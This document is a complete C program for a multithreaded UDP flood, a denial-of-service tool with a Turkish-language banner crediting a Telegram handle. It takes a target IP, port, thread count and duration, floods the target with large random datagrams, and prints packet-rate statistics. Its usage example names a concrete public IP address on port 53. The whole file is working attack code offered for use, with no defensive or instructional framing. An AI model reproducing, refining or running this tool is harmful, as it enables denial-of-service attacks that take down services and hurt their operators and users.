#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define RESET   "\033[0m"

typedef struct {
    char ip[16];
    int port;
    int thread_count;
    int duration;
    int running;
    long long packet_count;
    pthread_mutex_t lock;
    time_t start_time;
} AttackArgs;

void random_payload(unsigned char *buf, int size) {
    for (int i = 0; i < size; i++) buf[i] = rand() % 256;
}

void *udp_flood(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &addr.sin_addr);

    unsigned char payload[65500];
    int sndbuf = 2 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    while (args->running) {
        random_payload(payload, sizeof(payload));
        sendto(sockfd, payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
        pthread_mutex_lock(&args->lock);
        args->packet_count++;
        pthread_mutex_unlock(&args->lock);
    }
    close(sockfd);
    return NULL;
}

void *timer_thread(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    sleep(args->duration);
    args->running = 0;
    printf(YELLOW "\n[!] Süre doldu.\n" RESET);
    return NULL;
}

void *stats_thread(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    while (args->running) {
        sleep(5);
        time_t now = time(NULL);
        double elapsed = difftime(now, args->start_time);
        double pps = args->packet_count / elapsed;
        printf(CYAN "[+] %lld paket | PPS: %.0f | %.0fs\n" RESET, args->packet_count, pps, elapsed);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf(YELLOW "Kullanım: ./udp <IP> <port> <thread> <süre>\n");
        printf("Örnek: ./udp 193.31.7.11 53 10 60\n" RESET);
        return 1;
    }

    srand(time(NULL));
    system("clear");
    printf(RED "\n╔══════════════════════════════════╗\n");
    printf("║   UDP FLOOD - OPTİMİZE       ║\n");
    printf("║   Telegram: @Zeldyy_here     ║\n");
    printf("╚══════════════════════════════════╝\n" RESET);

    AttackArgs args;
    strcpy(args.ip, argv[1]);
    args.port = atoi(argv[2]);
    args.thread_count = atoi(argv[3]);
    args.duration = atoi(argv[4]);
    args.running = 1;
    args.packet_count = 0;
    args.start_time = time(NULL);
    pthread_mutex_init(&args.lock, NULL);

    printf(GREEN "\n[+] Hedef: %s:%d\n", args.ip, args.port);
    printf(CYAN "[+] Thread: %d\n", args.thread_count);
    printf(RED "[+] Saldırı başladı! CTRL+C durdur.\n" RESET);

    pthread_t timer, stats;
    pthread_create(&timer, NULL, timer_thread, &args);
    pthread_create(&stats, NULL, stats_thread, &args);

    pthread_t *threads = malloc(args.thread_count * sizeof(pthread_t));
    for (int i = 0; i < args.thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &args);
    }

    while (args.running) sleep(1);

    for (int i = 0; i < args.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);

    printf(GREEN "\n[+] Toplam Paket: %lld\n" RESET, args.packet_count);
    return 0;
}
